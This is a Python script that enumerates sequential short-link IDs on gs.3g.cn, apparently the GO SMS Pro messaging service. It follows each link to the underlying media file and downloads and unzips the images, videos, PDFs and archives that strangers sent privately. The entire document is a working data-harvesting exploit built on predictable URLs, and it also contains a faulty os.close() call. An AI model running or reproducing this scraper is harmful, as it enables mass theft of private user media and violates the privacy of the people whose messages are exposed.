import sys, time, requests, urllib.parse, mimetypes, zipfile, os
allowedExtensions = [".jpg", ".jpeg", ".png", ".zip", ".mp4", ".pdf"] #skipping audio and other files
from os.path import expanduser
home = expanduser("~")
localPath = home + "/Downloads/"
print("Downloads folder set to: ", localPath)
#first indexInt with content at 43520
for indexInt in range(43520,16777216):
    indexHex = '{0:02x}'.format(indexInt)
    site = "http://gs.3g.cn/D/" + indexHex + "/w"
    print("Trying: ", site, " at index: ", indexInt)
    success = False
    retries = 1
    while not success:
        r = requests.get(site)
        if r.status_code == 200:
            success = True
            imageUrl = r.url
            imageUrl = imageUrl.replace('http://gosms.gomocdn.com/mms/v14/index.html?u=', "")
            imageUrl = urllib.parse.unquote_plus(imageUrl)
            imageUrl = imageUrl.rsplit('&')[0]
            r = requests.get(imageUrl)
            if r.status_code == 200:
                content_type = r.headers['content-type']
                extension = mimetypes.guess_extension(content_type)
                fileName = localPath + str(indexHex) + str(extension)
                if extension in allowedExtensions:
                    with open(fileName, 'wb') as f:
                        f.write(r.content)
                        f.close()
                    print("Downloaded:", fileName)
                    if extension == ".zip":
                        extractPath = localPath + str(indexHex)
                        from pathlib import Path
                        Path(extractPath).mkdir(parents=True, exist_ok=True)
                        with zipfile.ZipFile(fileName, 'r') as zip_ref:
                                zip_ref.extractall(extractPath)
                                zip_ref.close()
                        os.remove(fileName)
                        os.close()
                elif extension == ".gif":
                    print("skipped .gif")
                else:
                    print("new extension: ", extension)
            else:
                print("Error getting file: ", r.status_code)
        else:
            if retries > 3:
                success = True
            else:
                wait = retries * 2
                print ("Error", r.status_code, "! Waiting ",wait," secs and re-trying...")
                time.sleep(wait)
                retries +=1
        r.close()